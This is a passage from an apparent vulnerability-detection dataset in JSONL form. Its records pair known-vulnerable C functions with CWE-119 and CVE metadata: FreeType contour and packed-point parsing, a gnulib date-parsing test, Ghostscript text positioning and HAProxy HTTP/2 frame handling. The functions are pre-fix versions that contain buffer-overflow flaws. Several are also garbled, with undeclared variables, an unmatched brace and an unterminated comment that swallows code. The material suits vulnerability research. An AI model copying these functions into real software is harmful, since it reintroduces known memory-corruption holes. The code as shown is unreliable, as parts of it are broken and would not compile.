FT_Error     error;\n\n\n    /* this might happen in invalid fonts */\n    if ( !outline )\n    {\n      FT_ERROR(( \"t1_builder_add_contour: no outline to add points to\\n\" ));\n      return FT_THROW( Invalid_File_Format );\n    }\n\n    if ( !builder->load_points )\n    {\n      outline->n_contours++;\n      return FT_Err_Ok;\n    }\n\n    error = FT_GLYPHLOADER_CHECK_POINTS( builder->loader, 0, 1 );\n    if ( !error )\n    {\n      if ( outline->n_contours > 0 )\n        outline->contours[outline->n_contours - 1] =\n          (short)( outline->n_points - 1 );\n\n      outline->n_contours++;\n    }\n\n    return error;\n  }\n\n\n  /* if a path was begun, add its first on-curve point */\n  FT_LOCAL_DEF( FT_Error )\n  t1_builder_start_point( T1_Builder  builder,\n                          FT_Pos      x,\n                          FT_Pos      y )\n  {\n    FT_Error  error = FT_ERR( Invalid_File_Format );\n\n\n    /* test whether we are building a new contour */\n\n    if ( builder->parse_state == T1_Parse_Have_Path )\n      error = FT_Err_Ok;\n    else\n    {\n      builder->parse_state = T1_Parse_Have_Path;\n      error = t1_builder_add_contour( builder );\n      if ( !error )\n        error = t1_builder_add_point1( builder, x, y );\n    }\n\n    return error;\n  }\n\n\n  /* close the current contour */\n  FT_LOCAL_DEF( void )\n  t1_builder_close_contour( T1_Builder  builder )\n  {\n    FT_Outline*  outline = builder->current;\n    FT_Int       first;\n\n\n    if ( !outline )\n      return;\n\n     first = outline->n_contours <= 1\n             ? 0 : outline->contours[outline->n_contours - 2] + 1;\n \n     /* We must not include the last point in the path if it */\n     /* is located on the first point.                       */\n     if ( outline->n_points > 1 )\n      if ( p1->x == p2->x && p1->y == p2->y )\n        if ( *control == FT_CURVE_TAG_ON )\n          outline->n_points--;\n    }\n\n    if ( outline->n_contours > 0 )\n    {\n      /* Don't add contours only consisting of one point, i.e.,  */\n      /* check whether the first and the last point is the same. */\n      if ( first == outline->n_points - 1 )\n      {\n        outline->n_contours--;\n        outline->n_points--;\n      }\n      else\n        outline->contours[outline->n_contours - 1] =\n          (short)( outline->n_points - 1 );\n    }\n  }\n", "func_hash": 328688916561979850895211877372718866822, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2017-8287", "cve_desc": "FreeType 2 before 2017-03-26 has an out-of-bounds write caused by a heap-based buffer overflow related to the t1_builder_close_contour function in psaux/psobjs.c.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-8287"}
{"idx": 216, "project": "savannah", "commit_id": "94e01571507835ff59dd8ce2a0b56a4b566965a4", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/gitweb/?p=gnulib.git;a=commit;h=94e01571507835ff59dd8ce2a0b56a4b566965a4", "commit_message": "None", "target": 1, "func": "main (int argc _GL_UNUSED, char **argv)\n{\n  struct timespec result;\n  struct timespec result2;\n  struct timespec expected;\n  struct timespec now;\n  const char *p;\n  int i;\n  long gmtoff;\n  time_t ref_time = 1304250918;\n\n  /* Set the time zone to US Eastern time with the 2012 rules.  This\n     should disable any leap second support.  Otherwise, there will be\n     a problem with glibc on sites that default to leap seconds; see\n     <http://bugs.gnu.org/12206>.  */\n  setenv (\"TZ\", \"EST5EDT,M3.2.0,M11.1.0\", 1);\n\n  gmtoff = gmt_offset (ref_time);\n\n\n  /* ISO 8601 extended date and time of day representation,\n     'T' separator, local time zone */\n  p = \"2011-05-01T11:55:18\";\n  expected.tv_sec = ref_time - gmtoff;\n  expected.tv_nsec = 0;\n  ASSERT (parse_datetime (&result, p, 0));\n  LOG (p, expected, result);\n  ASSERT (expected.tv_sec == result.tv_sec\n          && expected.tv_nsec == result.tv_nsec);\n\n  /* ISO 8601 extended date and time of day representation,\n     ' ' separator, local time zone */\n  p = \"2011-05-01 11:55:18\";\n  expected.tv_sec = ref_time - gmtoff;\n  expected.tv_nsec = 0;\n  ASSERT (parse_datetime (&result, p, 0));\n  LOG (p, expected, result);\n  ASSERT (expected.tv_sec == result.tv_sec\n          && expected.tv_nsec == result.tv_nsec);\n\n\n  /* ISO 8601, extended date and time of day representation,\n     'T' separator, UTC */\n  p = \"2011-05-01T11:55:18Z\";\n  expected.tv_sec = ref_time;\n  expected.tv_nsec = 0;\n  ASSERT (parse_datetime (&result, p, 0));\n  LOG (p, expected, result);\n  ASSERT (expected.tv_sec == result.tv_sec\n          && expected.tv_nsec == result.tv_nsec);\n\n  /* ISO 8601, extended date and time of day representation,\n     ' ' separator, UTC */\n  p = \"2011-05-01 11:55:18Z\";\n  expected.tv_sec = ref_time;\n  expected.tv_nsec = 0;\n  ASSERT (parse_datetime (&result, p, 0));\n  LOG (p, expected, result);\n  ASSERT (expected.tv_sec == result.tv_sec\n          && expected.tv_nsec == result.tv_nsec);\n\n\n  /* ISO 8601 extended date and time of day representation,\n     'T' separator, w/UTC offset */\n  p = \"2011-05-01T11:55:18-07:00\";\n  expected.tv_sec = 1304276118;\n  expected.tv_nsec = 0;\n  ASSERT (parse_datetime (&result, p, 0));\n  LOG (p, expected, result);\n  ASSERT (expected.tv_sec == result.tv_sec\n          && expected.tv_nsec == result.tv_nsec);\n\n  /* ISO 8601 extended date and time of day representation,\n     ' ' separator, w/UTC offset */\n  p = \"2011-05-01 11:55:18-07:00\";\n  expected.tv_sec = 1304276118;\n  expected.tv_nsec = 0;\n  ASSERT (parse_datetime (&result, p, 0));\n  LOG (p, expected, result);\n  ASSERT (expected.tv_sec == result.tv_sec\n          && expected.tv_nsec == result.tv_nsec);\n\n\n  /* ISO 8601 extended date and time of day representation,\n     'T' separator, w/hour only UTC offset */\n  p = \"2011-05-01T11:55:18-07\";\n  expected.tv_sec = 1304276118;\n  expected.tv_nsec = 0;\n  ASSERT (parse_datetime (&result, p, 0));\n  LOG (p, expected, result);\n  ASSERT (expected.tv_sec == result.tv_sec\n          && expected.tv_nsec == result.tv_nsec);\n\n  /* ISO 8601 extended date and time of day representation,\n     ' ' separator, w/hour only UTC offset */\n  p = \"2011-05-01 11:55:18-07\";\n  expected.tv_sec = 1304276118;\n  expected.tv_nsec = 0;\n  ASSERT (parse_datetime (&result, p, 0));\n  LOG (p, expected, result);\n  ASSERT (expected.tv_sec == result.tv_sec\n          && expected.tv_nsec == result.tv_nsec);\n\n\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"now\";\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  ASSERT (now.tv_sec == result.tv_sec && now.tv_nsec == result.tv_nsec);\n\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"tomorrow\";\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  ASSERT (now.tv_sec + 24 * 60 * 60 == result.tv_sec\n          && now.tv_nsec == result.tv_nsec);\n\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"yesterday\";\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  ASSERT (now.tv_sec - 24 * 60 * 60 == result.tv_sec\n          && now.tv_nsec == result.tv_nsec);\n\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"4 hours\";\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  ASSERT (now.tv_sec + 4 * 60 * 60 == result.tv_sec\n          && now.tv_nsec == result.tv_nsec);\n\n  /* test if timezone is not being ignored for day offset */\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"UTC+400 +24 hours\";\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  p = \"UTC+400 +1 day\";\n  ASSERT (parse_datetime (&result2, p, &now));\n  LOG (p, now, result2);\n  ASSERT (result.tv_sec == result2.tv_sec\n          && result.tv_nsec == result2.tv_nsec);\n\n  /* test if several time zones formats are handled same way */\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"UTC+14:00\";\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  p = \"UTC+14\";\n  ASSERT (parse_datetime (&result2, p, &now));\n  LOG (p, now, result2);\n  ASSERT (result.tv_sec == result2.tv_sec\n          && result.tv_nsec == result2.tv_nsec);\n  p = \"UTC+1400\";\n  ASSERT (parse_datetime (&result2, p, &now));\n  LOG (p, now, result2);\n  ASSERT (result.tv_sec == result2.tv_sec\n          && result.tv_nsec == result2.tv_nsec);\n\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"UTC-14:00\";\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  p = \"UTC-14\";\n  ASSERT (parse_datetime (&result2, p, &now));\n  LOG (p, now, result2);\n  ASSERT (result.tv_sec == result2.tv_sec\n          && result.tv_nsec == result2.tv_nsec);\n  p = \"UTC-1400\";\n  ASSERT (parse_datetime (&result2, p, &now));\n  LOG (p, now, result2);\n  ASSERT (result.tv_sec == result2.tv_sec\n          && result.tv_nsec == result2.tv_nsec);\n\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"UTC+0:15\";\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  p = \"UTC+0015\";\n  ASSERT (parse_datetime (&result2, p, &now));\n  LOG (p, now, result2);\n  ASSERT (result.tv_sec == result2.tv_sec\n          && result.tv_nsec == result2.tv_nsec);\n\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"UTC-1:30\";\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  p = \"UTC-130\";\n  ASSERT (parse_datetime (&result2, p, &now));\n  LOG (p, now, result2);\n  ASSERT (result.tv_sec == result2.tv_sec\n          && result.tv_nsec == result2.tv_nsec);\n\n\n  /* TZ out of range should cause parse_datetime failure */\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"UTC+25:00\";\n  ASSERT (!parse_datetime (&result, p, &now));\n\n        /* Check for several invalid countable dayshifts */\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"UTC+4:00 +40 yesterday\";\n  ASSERT (!parse_datetime (&result, p, &now));\n  p = \"UTC+4:00 next yesterday\";\n  ASSERT (!parse_datetime (&result, p, &now));\n  p = \"UTC+4:00 tomorrow ago\";\n  ASSERT (!parse_datetime (&result, p, &now));\n  p = \"UTC+4:00 tomorrow hence\";\n  ASSERT (!parse_datetime (&result, p, &now));\n  p = \"UTC+4:00 40 now ago\";\n  ASSERT (!parse_datetime (&result, p, &now));\n  p = \"UTC+4:00 last tomorrow\";\n  ASSERT (!parse_datetime (&result, p, &now));\n  p = \"UTC+4:00 -4 today\";\n  ASSERT (!parse_datetime (&result, p, &now));\n\n  /* And check correct usage of dayshifts */\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"UTC+400 tomorrow\";\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  p = \"UTC+400 +1 day\";\n  ASSERT (parse_datetime (&result2, p, &now));\n  LOG (p, now, result2);\n  ASSERT (result.tv_sec == result2.tv_sec\n          && result.tv_nsec == result2.tv_nsec);\n  p = \"UTC+400 1 day hence\";\n  ASSERT (parse_datetime (&result2, p, &now));\n  LOG (p, now, result2);\n  ASSERT (result.tv_sec == result2.tv_sec\n          && result.tv_nsec == result2.tv_nsec);\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"UTC+400 yesterday\";\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  p = \"UTC+400 1 day ago\";\n  ASSERT (parse_datetime (&result2, p, &now));\n  LOG (p, now, result2);\n  ASSERT (result.tv_sec == result2.tv_sec\n          && result.tv_nsec == result2.tv_nsec);\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"UTC+400 now\";\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  p = \"UTC+400 +0 minutes\"; /* silly, but simple \"UTC+400\" is different*/\n  ASSERT (parse_datetime (&result2, p, &now));\n  LOG (p, now, result2);\n  ASSERT (result.tv_sec == result2.tv_sec\n          && result.tv_nsec == result2.tv_nsec);\n\n  /* Check that some \"next Monday\", \"last Wednesday\", etc. are correct.  */\n  setenv (\"TZ\", \"UTC0\", 1);\n  for (i = 0; day_table[i]; i++)\n    {\n      unsigned int thur2 = 7 * 24 * 3600; /* 2nd thursday */\n      char tmp[32];\n      sprintf (tmp, \"NEXT %s\", day_table[i]);\n      now.tv_sec = thur2 + 4711;\n      now.tv_nsec = 1267;\n      ASSERT (parse_datetime (&result, tmp, &now));\n      LOG (tmp, now, result);\n      ASSERT (result.tv_nsec == 0);\n      ASSERT (result.tv_sec == thur2 + (i == 4 ? 7 : (i + 3) % 7) * 24 * 3600);\n\n      sprintf (tmp, \"LAST %s\", day_table[i]);\n      now.tv_sec = thur2 + 4711;\n      now.tv_nsec = 1267;\n      ASSERT (parse_datetime (&result, tmp, &now));\n      LOG (tmp, now, result);\n      ASSERT (result.tv_nsec == 0);\n      ASSERT (result.tv_sec == thur2 + ((i + 3) % 7 - 7) * 24 * 3600);\n    }\n\n  p = \"THURSDAY UTC+00\";  /* The epoch was on Thursday.  */\n  now.tv_sec = 0;\n  now.tv_nsec = 0;\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  ASSERT (result.tv_sec == now.tv_sec\n          && result.tv_nsec == now.tv_nsec);\n\n  p = \"FRIDAY UTC+00\";\n  now.tv_sec = 0;\n  now.tv_nsec = 0;\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  ASSERT (result.tv_sec == 24 * 3600\n          && result.tv_nsec == now.tv_nsec);\n\n  /* Exercise a sign-extension bug.  Before July 2012, an input\n     starting with a high-bit-set byte would be treated like \"0\".  */\n  ASSERT ( ! parse_datetime (&result, \"\\xb0\", &now));\n\n  /* Exercise TZ=\"\" parsing code.  */\n  /* These two would infloop or segfault before Feb 2014.  */\n  ASSERT ( ! parse_datetime (&result, \"TZ=\\\"\\\"\\\"\", &now));\n  ASSERT ( ! parse_datetime (&result, \"TZ=\\\"\\\" \\\"\", &now));\n  /* Exercise invalid patterns.  */\n  ASSERT ( ! parse_datetime (&result, \"TZ=\\\"\", &now));\n  ASSERT ( ! parse_datetime (&result, \"TZ=\\\"\\\\\\\"\", &now));\n  ASSERT ( ! parse_datetime (&result, \"TZ=\\\"\\\\n\", &now));\n  ASSERT ( ! parse_datetime (&result, \"TZ=\\\"\\\\n\\\"\", &now));\n  /* Exercise valid patterns.  */\n  ASSERT (   parse_datetime (&result, \"TZ=\\\"\\\"\", &now));\n  ASSERT (   parse_datetime (&result, \"TZ=\\\"\\\" \", &now));\n  ASSERT (   parse_datetime (&result, \" TZ=\\\"\\\"\", &now));\n   ASSERT (   parse_datetime (&result, \"TZ=\\\"\\\\\\\\\\\"\", &now));\n   ASSERT (   parse_datetime (&result, \"TZ=\\\"\\\\\\\"\\\"\", &now));\n \n   return 0;\n }\n", "func_hash": 85463602567582995767126053202641542542, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2017-7476", "cve_desc": "Gnulib before 2017-04-26 has a heap-based buffer overflow with the TZ environment variable. The error is in the save_abbr function in time_rz.c.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-7476"}
{"idx": 217, "project": "savannah", "commit_id": "59eb9f8cfe7d1df379a2318316d1f04f80fba54a", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=59eb9f8cfe7d1df379a2318316d1f04f80fba54a", "commit_message": "None", "target": 1, "func": "  ft_var_readpackedpoints( FT_Stream  stream,\n                           FT_UInt   *point_cnt )\n  {\n    FT_UShort *points;\n    FT_Int     n;\n    FT_Int     runcnt;\n    FT_Int     i;\n     FT_Int     j;\n     FT_Int     first;\n     FT_Memory  memory = stream->memory;\n    FT_Error   error = TT_Err_Ok;\n \n     FT_UNUSED( error );\n \n\n    *point_cnt = n = FT_GET_BYTE();\n    if ( n == 0 )\n      return ALL_POINTS;\n\n    if ( n & GX_PT_POINTS_ARE_WORDS )\n      n = FT_GET_BYTE() | ( ( n & GX_PT_POINT_RUN_COUNT_MASK ) << 8 );\n\n    if ( FT_NEW_ARRAY( points, n ) )\n      return NULL;\n\n    i = 0;\n    while ( i < n )\n    {\n      runcnt = FT_GET_BYTE();\n      if ( runcnt & GX_PT_POINTS_ARE_WORDS )\n      {\n         runcnt = runcnt & GX_PT_POINT_RUN_COUNT_MASK;\n         first  = points[i++] = FT_GET_USHORT();\n \n        if ( runcnt < 1 )\n           goto Exit;\n \n         /* first point not included in runcount */\n        for ( j = 0; j < runcnt; ++j )\n          points[i++] = (FT_UShort)( first += FT_GET_USHORT() );\n      }\n      else\n       {\n         first = points[i++] = FT_GET_BYTE();\n \n        if ( runcnt < 1 )\n           goto Exit;\n \n         for ( j = 0; j < runcnt; ++j )\n          points[i++] = (FT_UShort)( first += FT_GET_BYTE() );\n      }\n    }\n\n  Exit:\n    return points;\n  }\n", "func_hash": 176444419672545527315649492039587951909, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2010-3855", "cve_desc": "Buffer overflow in the ft_var_readpackedpoints function in truetype/ttgxvar.c in FreeType 2.4.3 and earlier allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted TrueType GX font.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2010-3855"}
{"idx": 218, "project": "ghostscript", "commit_id": "39b1e54b2968620723bf32e96764c88797714879", "project_url": "http://git.ghostscript.com/?p=mupdf", "commit_url": "http://git.ghostscript.com/?p=ghostpdl.git;a=commit;h=39b1e54b2968620723bf32e96764c88797714879", "commit_message": "None", "target": 1, "func": " set_text_distance(gs_point *pdist, double dx, double dy, const gs_matrix *pmat)\n {\n    int code = gs_distance_transform_inverse(dx, dy, pmat, pdist);\n     double rounded;\n \n     if (code == gs_error_undefinedresult) {\n         /* The CTM is degenerate.\n            Can't know the distance in user space.\n    } else if (code < 0)\n        return code;\n    /* If the distance is very close to integers, round it. */\n    if (fabs(pdist->x - (rounded = floor(pdist->x + 0.5))) < 0.0005)\n        pdist->x = rounded;\n    if (fabs(pdist->y - (rounded = floor(pdist->y + 0.5))) < 0.0005)\n        pdist->y = rounded;\n    return 0;\n}\n", "func_hash": 334604983653907615489271299004330168271, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2018-10194", "cve_desc": "The set_text_distance function in devices/vector/gdevpdts.c in the pdfwrite component in Artifex Ghostscript through 9.22 does not prevent overflows in text-positioning calculation, which allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via a crafted PDF document.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2018-10194"}
{"idx": 219, "project": "haproxy", "commit_id": "3f0e1ec70173593f4c2b3681b26c04a4ed5fc588", "project_url": "https://github.com/haproxy/haproxy", "commit_url": "http://git.haproxy.org/?p=haproxy.git;a=commitdiff;h=3f0e1ec70173593f4c2b3681b26c04a4ed5fc588", "commit_message": "BUG/CRITICAL: h2: fix incorrect frame length check\n\nThe incoming H2 frame length was checked against the max_frame_size\nsetting instead of being checked against the bufsize. The max_frame_size\nonly applies to outgoing traffic and not to incoming one, so if a large\nenough frame size is advertised in the SETTINGS frame, a wrapped frame\nwill be defragmented into a temporary allocated buffer where the second\nfragment my overflow the heap by up to 16 kB.\n\nIt is very unlikely that this can be exploited for code execution given\nthat buffers are very short lived and their address not realistically\npredictable in production, but the likeliness of an immediate crash is\nabsolutely certain.\n\nThis fix must be backported to 1.8.\n\nMany thanks to Jordan Zebor from F5 Networks for reporting this issue\nin a responsible way.", "target": 1, "func": "static void h2_process_demux(struct h2c *h2c)\n{\n\tstruct h2s *h2s;\n\n\tif (h2c->st0 >= H2_CS_ERROR)\n\t\treturn;\n\n\tif (unlikely(h2c->st0 < H2_CS_FRAME_H)) {\n\t\tif (h2c->st0 == H2_CS_PREFACE) {\n\t\t\tif (unlikely(h2c_frt_recv_preface(h2c) <= 0)) {\n\t\t\t\t/* RFC7540#3.5: a GOAWAY frame MAY be omitted */\n\t\t\t\tif (h2c->st0 == H2_CS_ERROR)\n\t\t\t\t\th2c->st0 = H2_CS_ERROR2;\n\t\t\t\tgoto fail;\n\t\t\t}\n\n\t\t\th2c->max_id = 0;\n\t\t\th2c->st0 = H2_CS_SETTINGS1;\n\t\t}\n\n\t\tif (h2c->st0 == H2_CS_SETTINGS1) {\n\t\t\tstruct h2_fh hdr;\n\n\t\t\t/* ensure that what is pending is a valid SETTINGS frame\n\t\t\t * without an ACK.\n\t\t\t */\n\t\t\tif (!h2_get_frame_hdr(h2c->dbuf, &hdr)) {\n\t\t\t\t/* RFC7540#3.5: a GOAWAY frame MAY be omitted */\n\t\t\t\tif (h2c->st0 == H2_CS_ERROR)\n\t\t\t\t\th2c->st0 = H2_CS_ERROR2;\n\t\t\t\tgoto fail;\n\t\t\t}\n\n\t\t\tif (hdr.sid || hdr.ft != H2_FT_SETTINGS || hdr.ff & H2_F_SETTINGS_ACK) {\n\t\t\t\t/* RFC7540#3.5: a GOAWAY frame MAY be omitted */\n\t\t\t\th2c_error(h2c, H2_ERR_PROTOCOL_ERROR);\n\t\t\t\th2c->st0 = H2_CS_ERROR2;\n                                goto fail;\n                        }\n \n                       if ((int)hdr.len < 0 || (int)hdr.len > h2c->mfs) {\n                                /* RFC7540#3.5: a GOAWAY frame MAY be omitted */\n                                h2c_error(h2c, H2_ERR_FRAME_SIZE_ERROR);\n                                h2c->st0 = H2_CS_ERROR2;\n\t\t\t\tgoto fail;\n\t\t\t}\n\n\t\t\t/* that's OK, switch to FRAME_P to process it */\n\t\t\th2c->dfl = hdr.len;\n\t\t\th2c->dsi = hdr.sid;\n\t\t\th2c->dft = hdr.ft;\n\t\t\th2c->dff = hdr.ff;\n\t\t\th2c->dpl = 0;\n\t\t\th2c->st0 = H2_CS_FRAME_P;\n\t\t}\n\t}\n\n\t/* process as many incoming frames as possible below */\n\twhile (h2c->dbuf->i) {\n\t\tint ret = 0;\n\n\t\tif (h2c->st0 >= H2_CS_ERROR)\n\t\t\tbreak;\n\n\t\tif (h2c->st0 == H2_CS_FRAME_H) {\n\t\t\tstruct h2_fh hdr;\n\n                        if (!h2_peek_frame_hdr(h2c->dbuf, &hdr))\n                                break;\n \n                       if ((int)hdr.len < 0 || (int)hdr.len > h2c->mfs) {\n                                h2c_error(h2c, H2_ERR_FRAME_SIZE_ERROR);\n                                h2c->st0 = H2_CS_ERROR;\n                                break;\n\t\t\t}\n\n\t\t\th2c->dfl = hdr.len;\n\t\t\th2c->dsi = hdr.sid;\n\t\t\th2c->dft = hdr.ft;\n\t\t\th2c->dff = hdr.ff;\n\t\t\th2c->dpl = 0;\n\t\t\th2c->st0 = H2_CS_FRAME_P;\n\t\t\th2_skip_frame_hdr(h2c->dbuf);\n\t\t}\n\n\t\t/* Only H2_CS_FRAME_P and H2_CS_FRAME_A here */\n\t\th2s = h2c_st_by_id(h2c, h2c->dsi);\n\n\t\tif (h2c->st0 == H2_CS_FRAME_E)\n\t\t\tgoto strm_err;\n\n\t\tif (h2s->st == H2_SS_IDLE &&\n\t\t    h2c->dft != H2_FT_HEADERS && h2c->dft != H2_FT_PRIORITY) {\n\t\t\t/* RFC7540#5.1: any frame other than HEADERS or PRIORITY in\n\t\t\t * this state MUST be treated as a connection error\n\t\t\t */\n\t\t\th2c_error(h2c, H2_ERR_PROTOCOL_ERROR);\n\t\t\th2c->st0 = H2_CS_ERROR;\n\t\t\tbreak;\n\t\t}\n\n\t\tif (h2s->st == H2_SS_HREM && h2c->dft != H2_FT_WINDOW_UPDATE &&\n\t\t    h2c->dft != H2_FT_RST_STREAM && h2c->dft != H2_FT_PRIORITY) {\n\t\t\t/* RFC7540#5.1: any frame other than WU/PRIO/RST in\n\t\t\t * this state MUST be treated as a stream error\n\t\t\t */\n\t\t\th2s_error(h2s, H2_ERR_STREAM_CLOSED);\n\t\t\th2c->st0 = H2_CS_FRAME_E;\n\t\t\tgoto strm_err;\n\t\t}\n\n\t\t/* Below the management of frames received in closed state is a\n\t\t * bit hackish because the spec makes strong differences between\n\t\t * streams closed by receiving RST, sending RST, and seeing ES\n\t\t * in both directions. In addition to this, the creation of a\n\t\t * new stream reusing the identifier of a closed one will be\n\t\t * detected here. Given that we cannot keep track of all closed\n\t\t * streams forever, we consider that unknown closed streams were\n\t\t * closed on RST received, which allows us to respond with an\n\t\t * RST without breaking the connection (eg: to abort a transfer).\n\t\t * Some frames have to be silently ignored as well.\n\t\t */\n\t\tif (h2s->st == H2_SS_CLOSED && h2c->dsi) {\n\t\t\tif (h2c->dft == H2_FT_HEADERS || h2c->dft == H2_FT_PUSH_PROMISE) {\n\t\t\t\t/* #5.1.1: The identifier of a newly\n\t\t\t\t * established stream MUST be numerically\n\t\t\t\t * greater than all streams that the initiating\n\t\t\t\t * endpoint has opened or reserved. This\n\t\t\t\t * governs streams that are opened using a\n\t\t\t\t * HEADERS frame and streams that are reserved\n\t\t\t\t * using PUSH_PROMISE. An endpoint that\n\t\t\t\t * receives an unexpected stream identifier\n\t\t\t\t * MUST respond with a connection error.\n\t\t\t\t */\n\t\t\t\th2c_error(h2c, H2_ERR_STREAM_CLOSED);\n\t\t\t\tgoto strm_err;\n\t\t\t}\n\n\t\t\tif (h2s->flags & H2_SF_RST_RCVD) {\n\t\t\t\t/* RFC7540#5.1:closed: an endpoint that\n\t\t\t\t * receives any frame other than PRIORITY after\n\t\t\t\t * receiving a RST_STREAM MUST treat that as a\n\t\t\t\t * stream error of type STREAM_CLOSED.\n\t\t\t\t *\n\t\t\t\t * Note that old streams fall into this category\n\t\t\t\t * and will lead to an RST being sent.\n\t\t\t\t */\n\t\t\t\th2s_error(h2s, H2_ERR_STREAM_CLOSED);\n\t\t\t\th2c->st0 = H2_CS_FRAME_E;\n\t\t\t\tgoto strm_err;\n\t\t\t}\n\n\t\t\t/* RFC7540#5.1:closed: if this state is reached as a\n\t\t\t * result of sending a RST_STREAM frame, the peer that\n\t\t\t * receives the RST_STREAM might have already sent\n\t\t\t * frames on the stream that cannot be withdrawn. An\n\t\t\t * endpoint MUST ignore frames that it receives on\n\t\t\t * closed streams after it has sent a RST_STREAM\n\t\t\t * frame. An endpoint MAY choose to limit the period\n\t\t\t * over which it ignores frames and treat frames that\n\t\t\t * arrive after this time as being in error.\n\t\t\t */\n\t\t\tif (!(h2s->flags & H2_SF_RST_SENT)) {\n\t\t\t\t/* RFC7540#5.1:closed: any frame other than\n\t\t\t\t * PRIO/WU/RST in this state MUST be treated as\n\t\t\t\t * a connection error\n\t\t\t\t */\n\t\t\t\tif (h2c->dft != H2_FT_RST_STREAM &&\n\t\t\t\t    h2c->dft != H2_FT_PRIORITY &&\n\t\t\t\t    h2c->dft != H2_FT_WINDOW_UPDATE) {\n\t\t\t\t\th2c_error(h2c, H2_ERR_STREAM_CLOSED);\n\t\t\t\t\tgoto strm_err;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n#if 0\n\n\t\t/* graceful shutdown, ignore streams whose ID is higher than\n\t\t * the one advertised in GOAWAY. RFC7540#6.8.\n\t\t */\n\t\tif (unlikely(h2c->last_sid >= 0) && h2c->dsi > h2c->last_sid) {\n\t\t\tret = MIN(h2c->dbuf->i, h2c->dfl);\n\t\t\tbi_del(h2c->dbuf, ret);\n\t\t\th2c->dfl -= ret;\n\t\t\tret = h2c->dfl == 0;\n\t\t\tgoto strm_err;\n\t\t}\n#endif\n\n\t\tswitch (h2c->dft) {\n\t\tcase H2_FT_SETTINGS:\n\t\t\tif (h2c->st0 == H2_CS_FRAME_P)\n\t\t\t\tret = h2c_handle_settings(h2c);\n\n\t\t\tif (h2c->st0 == H2_CS_FRAME_A)\n\t\t\t\tret = h2c_ack_settings(h2c);\n\t\t\tbreak;\n\n\t\tcase H2_FT_PING:\n\t\t\tif (h2c->st0 == H2_CS_FRAME_P)\n\t\t\t\tret = h2c_handle_ping(h2c);\n\n\t\t\tif (h2c->st0 == H2_CS_FRAME_A)\n\t\t\t\tret = h2c_ack_ping(h2c);\n\t\t\tbreak;\n\n\t\tcase H2_FT_WINDOW_UPDATE:\n\t\t\tif (h2c->st0 == H2_CS_FRAME_P)\n\t\t\t\tret = h2c_handle_window_update(h2c, h2s);\n\t\t\tbreak;\n\n\t\tcase H2_FT_CONTINUATION:\n\t\t\t/* we currently don't support CONTINUATION frames since\n\t\t\t * we have nowhere to store the partial HEADERS frame.\n\t\t\t * Let's abort the stream on an INTERNAL_ERROR here.\n\t\t\t */\n\t\t\tif (h2c->st0 == H2_CS_FRAME_P) {\n\t\t\t\th2s_error(h2s, H2_ERR_INTERNAL_ERROR);\n\t\t\t\th2c->st0 = H2_CS_FRAME_E;\n\t\t\t}\n\t\t\tbreak;\n\n\t\tcase H2_FT_HEADERS:\n\t\t\tif (h2c->st0 == H2_CS_FRAME_P)\n\t\t\t\tret = h2c_frt_handle_headers(h2c, h2s);\n\t\t\tbreak;\n\n\t\tcase H2_FT_DATA:\n\t\t\tif (h2c->st0 == H2_CS_FRAME_P)\n\t\t\t\tret = h2c_frt_handle_data(h2c, h2s);\n\n\t\t\tif (h2c->st0 == H2_CS_FRAME_A)\n\t\t\t\tret = h2c_send_strm_wu(h2c);\n\t\t\tbreak;\n\n\t\tcase H2_FT_PRIORITY:\n\t\t\tif (h2c->st0 == H2_CS_FRAME_P)\n\t\t\t\tret = h2c_handle_priority(h2c);\n\t\t\tbreak;\n\n\t\tcase H2_FT_RST_STREAM:\n\t\t\tif (h2c->st0 == H2_CS_FRAME_P)\n\t\t\t\tret = h2c_handle_rst_stream(h2c, 